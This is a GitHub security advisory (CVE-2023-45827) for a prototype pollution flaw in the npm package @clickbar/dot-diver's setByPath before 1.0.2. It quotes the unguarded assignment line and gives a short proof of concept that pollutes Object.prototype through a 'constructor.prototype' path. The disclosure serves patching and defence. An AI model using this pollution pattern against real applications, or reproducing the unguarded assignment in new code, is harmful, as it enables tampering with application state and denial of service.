# [H] Prototype Pollution(PP) vulnerability in setByPath

## Summary
Severity: High
Advisory: GHSA-9w5f-mw3p-pj47
CVE: CVE-2023-45827
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2023-11-03
Source: https://github.com/advisories/GHSA-9w5f-mw3p-pj47
Type: github-advisory

## Affected
- npm: `@clickbar/dot-diver` — affected >=0 <1.0.2

## Details
### Summary
There is a Prototype Pollution(PP) vulnerability in dot-diver. It can leads to RCE.

### Details
```javascript
//https://github.com/clickbar/dot-diver/tree/main/src/index.ts:277

// eslint-disable-next-line @typescript-eslint/no-unsafe-member-access
  objectToSet[lastKey] = value
```
In this code, there is no validation for Prototpye Pollution.

### PoC
```javascript
import { getByPath, setByPath } from '@clickbar/dot-diver'

console.log({}.polluted); // undefined
setByPath({},'constructor.prototype.polluted', 'foo');
console.log({}.polluted); // foo
```

### Impact
It is Prototype Pollution(PP) and it can leads to Dos, RCE, etc.

### Credits
Team : NodeBoB

최지혁   ( Jihyeok Choi )

이동하 ( Lee Dong Ha of ZeroPointer Lab )

강성현    ( kang seonghyeun )

박성진    ( sungjin park )

김찬호    ( Chanho Kim )

이수영    ( Lee Su Young )

김민욱    ( MinUk Kim )

## References
- https://github.com/clickbar/dot-diver/security/advisories/GHSA-9w5f-mw3p-pj47
- https://nvd.nist.gov/vuln/detail/CVE-2023-45827
- https://github.com/clickbar/dot-diver/commit/9790834cf4c2bca75db00e588e58056dacaf602f
- https://github.com/clickbar/dot-diver/commit/98daf567390d816fd378ec998eefe2e97f293d5a
- https://github.com/clickbar/dot-diver
